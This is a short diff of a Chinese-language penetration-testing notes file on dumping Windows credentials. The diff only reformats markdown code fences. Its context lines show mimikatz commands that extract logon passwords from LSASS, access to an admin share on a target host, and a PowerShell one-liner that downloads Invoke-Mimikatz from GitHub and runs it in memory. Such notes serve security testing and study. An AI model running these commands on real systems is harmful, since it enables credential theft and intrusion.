@@ -26,7 +26,7 @@ mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 1、结合procdump解密如上
 
 2、上传mimikatz.exe直接在目标机器上解密
-```shell
+- ```shell
 mimikatz.exe "privilege::debug" exit
 mimikatz.exe "sekurlsa::logonpasswords" exit
 ```
@@ -49,7 +49,7 @@ dir \\A-635ECAEE64804.TEST.LOCAL\c$
 ```
 
 4、通过powershell无文件加载mimikatz
-```shell
+- ```shell
 powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
 ```
 
